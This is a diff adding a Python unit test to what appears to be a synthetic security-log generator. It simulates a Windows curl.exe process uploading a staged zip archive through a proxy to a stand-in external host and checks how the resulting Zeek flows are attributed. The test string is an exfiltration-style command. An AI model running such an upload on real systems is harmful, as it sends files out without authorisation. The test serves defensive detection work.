@@ -273,6 +273,92 @@ def test_explicit_multipart_curl_remains_authoritative_proxy_socket_owner() -> N
     assert image == "/usr/bin/curl"
 
 
+def test_explicit_multipart_curl_owns_nested_proxy_connect_transport() -> None:
+    """A proxy child transport must not replace its bundle-owned curl process."""
+    generator, emitters = _generator(
+        [
+            NetworkSensor(
+                type="network",
+                name="both-sides",
+                monitoring_segments=["workstations", "dmz"],
+                direction="bidirectional",
+                log_formats=["zeek"],
+            )
+        ]
+    )
+    user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
+    source = generator._ip_to_system["10.0.1.10"]
+    start = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+    archive = r"C:\ProgramData\Microsoft\cache_7f3a.zip"
+    command = (
+        r"C:\Windows\System32\curl.exe --proxy http://10.0.3.10:8080 "
+        rf'-F "archive=@{archive};type=application/zip" '
+        "https://api.example.net/upload/telemetry/7f3a2b19"
+    )
+    pid = generator.state_manager.create_process(
+        system=source.hostname,
+        parent_pid=explorer_pid,
+        image=r"C:\Windows\System32\curl.exe",
+        command_line=command,
+        username=user.username,
+        integrity_level="Medium",
+        logon_id=generator.state_manager.get_process(source.hostname, explorer_pid).logon_id,
+    )
+    multipart = build_http_multipart_context(
+        HttpMultipartEntitySpec.model_validate(
+            {
+                "media_type": "multipart/form-data",
+                "parts": [
+                    {
+                        "name": "archive",
+                        "body_len": 4096,
+                        "local_source_path": archive,
+                        "filename": "cache_7f3a.zip",
+                        "content_type": "application/zip",
+                    }
+                ],
+            }
+        ),
+        stable_key="nested-explicit-owner",
+    )
+
+    generator.generate_connection(
+        src_ip=source.ip,
+        dst_ip="45.33.32.30",
+        time=start + timedelta(seconds=2),
+        dst_port=443,
+        service="ssl",
+        duration=4.0,
+        source_system=source,
+        pid=pid,
+        process_image=r"C:\Windows\System32\curl.exe",
+        hostname="api.example.net",
+        preserve_dst_ip=True,
+        http=HttpContext(
+            method="POST",
+            host="api.example.net",
+            uri="/upload/telemetry/7f3a2b19",
+            user_agent="curl/8.4.0",
+            request_body_len=multipart.body_len,
+            response_body_len=2048,
+            request_multipart=multipart,
+        ),
+    )
+
+    client_flows = [
+        call.args[0]
+        for call in emitters["zeek_conn"].emit.call_args_list
+        if call.args[0].network.src_ip == source.ip and call.args[0].network.dst_ip == "10.0.3.10"
+    ]
+    assert client_flows
+    assert all(event.network.initiating_pid == pid for event in client_flows)
+    assert all(event.process is not None for event in client_flows)
+    assert all(event.process.pid == pid for event in client_flows if event.process is not None)
+    assert all(
+        event.process.command_line == command for event in client_flows if event.process is not None
+    )
+
+
 def test_activity_generator_collapses_generated_browser_family_user_agents():
     generator = ActivityGenerator(StateManager(), {})
     workstation = System(
